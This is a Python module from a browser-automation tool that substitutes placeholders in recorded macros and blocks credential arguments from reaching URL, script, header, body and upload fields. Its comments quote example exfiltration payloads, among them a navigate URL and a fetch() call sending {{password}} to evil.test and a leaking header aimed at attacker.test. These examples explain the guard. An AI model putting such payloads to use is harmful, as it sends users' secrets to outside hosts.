# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

from __future__ import annotations

import copy
import os
import re
from typing import Any
from urllib.parse import urlsplit

from octowright.macros.privacy import is_credential_key

SEMANTIC_LOCATOR_KEYS = (
    "role",
    "role_name",
    "label",
    "text",
    "test_id",
    "role_exact",
    "label_exact",
    "text_exact",
)
#: The keys that can actually RESOLVE an element. build_locator requires
#: exactly one of these; everything else in SEMANTIC_LOCATOR_KEYS is a modifier
#: (`role_name` narrows a role, the `*_exact` flags narrow the match), so
#: "has a semantic key" must never be read as "has a locator".
SEMANTIC_FINDER_KEYS = ("role", "label", "text", "test_id")
# Keys that carry no human-readable ARIA text and so are noise in a digest.
# The *_exact flags are modifiers on another key, never a name themselves.
NON_ARIA_NOISE_KEYS = ("role", "role_name", "test_id", "role_exact", "label_exact", "text_exact")
# Bookkeeping the recorder and the scenario layer stamp onto an event. None is
# an input to any session method, so all of them are stripped before dispatch.
# `persona` and `scenario_role` come from scenarios_pool, which stamps both onto
# every merged tail event; without them here, replaying a scenario-derived
# recording raises TypeError: navigate() got an unexpected keyword argument.
#
# `scenario_role` is spelled that way BECAUSE stripping cannot fix a collision.
# Writing the label to `role` collides: `role` is also the ARIA locator key
# on click/fill/click_by/fill_by/get_text_by — and `strip_non_aria_noise` returns
# those actions untouched precisely because `role` is their locator. So the label
# would both destroy a recorded ARIA role and inject one where there was none, with
# nothing downstream able to tell the two apart. Renaming at the source is the
# only fix; do not re-add a bare `role` here.
RECORDING_NOISE_KEYS = ("action", "ts", "kind", "profile", "instance_id", "persona", "scenario_role")


def normalise_parameters(parameters: list[str] | dict[str, str] | None) -> dict[str, str]:
    if parameters is None:
        return {}
    if isinstance(parameters, dict):
        return parameters
    return {f"params[{i}]": v for i, v in enumerate(parameters)}


def substitute_in_action(action: dict[str, Any], value_to_name: dict[str, str]) -> dict[str, Any]:
    result: dict[str, Any] = {}
    for key, value in action.items():
        if isinstance(value, str) and value in value_to_name:
            result[key] = "{{" + value_to_name[value] + "}}"
        else:
            result[key] = value
    return result


def action_kwargs(action: dict[str, Any]) -> dict[str, Any]:
    return {key: value for key, value in action.items() if key not in RECORDING_NOISE_KEYS}


#: Actions whose locator IS the semantic keys, so stripping them would remove
#: the thing the action matches on. Enumerated rather than inferred, and it has
#: already been missed once: get_text_by was absent, so replaying one called
#: session.get_text_by() with no finder at all.
_SEMANTIC_ACTIONS = {"click", "fill", "click_by", "fill_by", "get_text_by", "upload_files"}


def strip_non_aria_noise(kind: str, kwargs: dict[str, Any]) -> dict[str, Any]:
    if kind in _SEMANTIC_ACTIONS:
        return dict(kwargs)

    cleaned = dict(kwargs)
    for key in NON_ARIA_NOISE_KEYS:
        cleaned.pop(key, None)
    return cleaned


# Action fields that either leave the machine or execute code. A credential
# expanded into one of these is exfiltration, not automation:
# ``{"action": "navigate", "url": "https://evil.test/?p={{password}}"}`` sends
# the secret to whoever wrote the macro, and ``evaluate`` hands it to page JS.
#
# The set is by FIELD NAME, so it has to grow whenever a new action introduces
# a differently-spelled code sink. ``a11y_dragdrop`` did exactly that: its
# ``verify_js`` and ``grabbed_predicate_js`` are handed straight to
# ``locator.evaluate``/``target.evaluate``, so
# ``{"action": "a11y_dragdrop", "verify_js": "() => fetch('https://evil.test/?p={{password}}')"}``
# was an unguarded ``evaluate`` under a different name.
#
# The same gap existed for fields that leave the machine without being a URL.
# ``headers`` (inject_headers, set_extra_http_headers, mock_route) rides every
# matching request, and inject_headers takes an attacker-chosen ``pattern``, so
# ``{"headers": {"X-Leak": "{{password}}"}}`` with ``pattern:
# "https://attacker.test/**"`` delivered the password to that host. mock_route's
# ``body`` is served to the page -- for a script request it is code the page
# runs. An upload's ``paths`` entry becomes the filename the server receives.
# Audited against every action in ``runtime._ACTION_MAP``: the remaining string
# fields (selectors, locator text, ``pattern`` match strings, ``expect_*``
# needles, ``value``/``text`` typed into the page, the screenshot ``path``
# contained under RECORDINGS_DIR) are matched locally or ARE the intended
# destination of a credential.
CREDENTIAL_UNSAFE_KEYS = frozenset(
    {"url", "expression", "verify_js", "grabbed_predicate_js", "headers", "body", "paths"}
)

#: Arg names whose value is treated as a secret. Deliberately name-based: the
#: substituter sees opaque caller-supplied args and has no other signal, and
#: matching on the name is what lets ``{{order_id}}`` keep working in a URL
#: (the common parameterized-navigation pattern) while ``{{password}}`` does
#: not.
#: Delegated to the shared vocabulary rather than owned here. This regex used
#: to be a third, independently-maintained credential list, and it had drifted:
#: it knew ``otp`` (which neither redactor did) while missing ``passphrase``,
#: ``pw``, ``pwd``, ``authorization``, ``access_key`` and ``private_key`` -- so
#: ``{{passphrase}}`` could expand into a URL while ``{{password}}`` was
#: refused. The sink guard acts on the CREDENTIAL tier only, which is what
#: keeps identity args working in a parameterized URL.

_CREDENTIAL_SINKS_OFF = frozenset({"0", "off", "false", "no", "never", "none", "disabled", "allow"})


def credential_sinks_blocked() -> bool:
    """Whether to refuse a credential-named arg in a navigation/code sink.

    ON by default. Set ``OCTOWRIGHT_MACRO_CREDENTIAL_SINKS`` to a falsey token
    (or ``allow``) for a suite that intentionally puts a token in a URL --
    an API-key query parameter is the legitimate case this would otherwise
    break.
    """
    raw = os.environ.get("OCTOWRIGHT_MACRO_CREDENTIAL_SINKS", "block").strip().lower()
    return raw not in _CREDENTIAL_SINKS_OFF


def is_credential_arg(name: str) -> bool:
    return is_credential_key(name)


#: Actions whose ``headers`` go only where their ``pattern`` matches.
#: ``set_extra_http_headers`` is absent on purpose: it rides every request the
#: page makes, third-party hosts included, so it has no destination to vet.
_PATTERN_SCOPED_HEADER_ACTIONS = frozenset({"inject_headers", "mock_route"})

#: A pattern names one host only when its host part is spelled out: no
#: wildcard, no placeholder, no userinfo. ``https://*.example.test/**`` and
#: ``https://{{host}}/**`` choose the host at match or run time, and
#: ``https://app.test@attacker.test/`` is attacker.test to a URL parser.
_LITERAL_PATTERN_HOST = re.compile(r"^https?://([^/?#*{}\[\]@]+)(?:/|$)", re.IGNORECASE)

_LOOPBACK_HOSTS = frozenset({"127.0.0.1", "localhost", "::1"})


def own_site_hosts(session: Any) -> set[str]:
    """The hosts the operator, not the macro, pointed this session at.

    The launch URL and the persona ``base_url`` are chosen by whoever launched
    the browser. A host the macro navigates to is not: a poisoned macro could
    navigate to its own server and then name it. octowright's own new-tab page
    (a launch with no URL) is not an app either, though a local dev stack on
    ``localhost`` is.
    """
    hosts: set[str] = set()
    for url in (getattr(session, "url", None), getattr(session, "base_url", None)):
        if not isinstance(url, str) or not url:
            continue
        parts = urlsplit(url)
        host = (parts.hostname or "").lower()
        if not host or (host in _LOOPBACK_HOSTS and parts.path.rstrip("/") == "/new-tab"):
            continue
        hosts.add(host)
    return hosts


def _headers_reach_own_site(action: dict[str, Any], trusted_hosts: frozenset[str] | set[str]) -> bool:
    if not trusted_hosts or action.get("action") not in _PATTERN_SCOPED_HEADER_ACTIONS:
        return False
    pattern = action.get("pattern", action.get("url_pattern"))
    match = _LITERAL_PATTERN_HOST.match(pattern) if isinstance(pattern, str) else None
    return match is not None and match.group(1).rsplit(":", 1)[0].lower() in trusted_hosts


def _substitute_value(
    value: Any, args: dict[str, Any], *, unsafe_sink: bool = False, headers_exempt: bool = False
) -> Any:
    if isinstance(value, str):

        def replacer(match: re.Match[str]) -> str:
            key = match.group(1)
            if key not in args:
                raise KeyError(f"placeholder {{{{{key}}}}} has no matching arg; available: {list(args)}")
            if unsafe_sink and is_credential_arg(key) and credential_sinks_blocked():
                raise ValueError(
                    f"macro expands credential arg {{{{{key}}}}} into a navigation or code sink; "
                    "this would send the secret off-machine. A header may carry one through "
                    "inject_headers whose pattern names the session's own site (its launch URL "
                    "or persona base_url). Set OCTOWRIGHT_MACRO_CREDENTIAL_SINKS=allow if that is intended."
                )
            return str(args[key])

        return re.sub(r"\{\{([^}]+)\}\}", replacer, value)
    if isinstance(value, dict):
        return {
            key: _substitute_value(
                item,
                args,
                unsafe_sink=unsafe_sink
                or (key in CREDENTIAL_UNSAFE_KEYS and not (headers_exempt and key == "headers")),
            )
            for key, item in value.items()
        }
    if isinstance(value, list):
        return [_substitute_value(item, args, unsafe_sink=unsafe_sink) for item in value]
    return value


def substitute(
    actions: list[dict[str, Any]], args: dict[str, Any], *, trusted_hosts: frozenset[str] | set[str] = frozenset()
) -> list[dict[str, Any]]:
    """Expand ``{{name}}`` placeholders, refusing a credential in a sink.

    *trusted_hosts* (``own_site_hosts(session)``) is the one exemption: a
    credential in the ``headers`` of an action whose pattern names one of them.
    """
    return [
        _substitute_value(copy.deepcopy(action), args, headers_exempt=_headers_reach_own_site(action, trusted_hosts))
        for action in actions
    ]
